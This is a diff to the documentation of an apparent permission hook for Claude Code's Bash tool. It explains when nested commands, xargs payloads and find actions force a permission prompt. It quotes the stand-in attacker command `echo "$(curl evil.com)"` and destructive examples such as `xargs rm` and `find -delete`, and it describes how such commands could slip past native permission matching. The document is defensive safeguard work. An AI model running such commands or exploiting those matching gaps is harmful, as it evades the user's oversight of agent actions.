@@ -23,7 +23,11 @@ For each tool call, the hook returns one of four outcomes:
 - **`ask`** -- a sub-command matches an ask pattern, or a redirect fails a safety check that Claude Code doesn't perform itself. The hook forces Claude Code's permission prompt.
 - **defer** (no decision) -- the hook can't affirmatively approve a *top-level* command, but native's own splitting sees the same command, so the hook stays silent and lets Claude Code decide. Implemented the documented way: exit 0 with empty stdout.
 
-Defer keeps the hook **additive** for top-level commands -- it only *upgrades* those to `allow`/`deny` and never adds a prompt native wouldn't have shown. But it defers only where native is known to see the same command. When the unapproved command is **nested** (inside a substitution, subshell, loop, etc.), native's operator-splitting can't see it and might approve the enclosing read-only command on its own -- so there the hook forces `ask` instead of deferring. That's the case native can't cover and the hook must: e.g. `echo "$(curl evil.com)"` prompts, because native would otherwise auto-approve the read-only `echo` without inspecting the `curl` inside.
+Defer keeps the hook **additive** for top-level commands -- it only *upgrades* those to `allow`/`deny` and never adds a prompt native wouldn't have shown. But it defers only where native is known to see the same command. Where the hook detects a hazard native's own matching can't be trusted to enforce, it forces `ask` instead:
+
+- a **nested** unapproved command (inside a substitution, subshell, loop, etc.) that native's operator-splitting can't see -- e.g. `echo "$(curl evil.com)"` prompts, because native would otherwise auto-approve the read-only `echo` without inspecting the `curl`;
+- an **`xargs` payload** whose static form matches only an exact rule that doesn't cover the stdin args native strips-and-approves blind to;
+- a **mutating `find` action** (`-delete`, `-fprintf`, `-ok`, ...) or an unreadable `find` payload that could otherwise ride a broad `Bash(find *)`.
 
 ### What gets checked
 
@@ -112,9 +116,11 @@ of what actually runs. To avoid approving more than a rule intends, an `xargs`
 payload is auto-approved only by a rule that tolerates arbitrary trailing arguments
 -- a trailing wildcard like `Bash(rm *)` or `Bash(rm /tmp/x*)`. An *exact* rule such
 as `Bash(rm /tmp/x)` does **not** approve `... | xargs rm /tmp/x` (which really runs
-`rm /tmp/x <stdin>`); that defers to Claude Code. Replace mode (`xargs -I{} CMD {}`)
-substitutes at the visible `{}` placeholder instead of appending, so it is matched
-as written, the same as `find -exec`.
+`rm /tmp/x <stdin>`) -- and because native strips a bare `xargs` and *would* approve
+on that same exact rule (it doesn't model the appended tokens), the hook forces a
+prompt here rather than deferring. Replace mode (`xargs -I{} CMD {}`) substitutes at
+the visible `{}` placeholder instead of appending, so it is matched as written, the
+same as `find -exec`.
 
 This matches Claude Code's built-in wrapper stripping, with two intentional
 differences: this hook also unwraps `xargs` when it carries flags (`xargs -n1
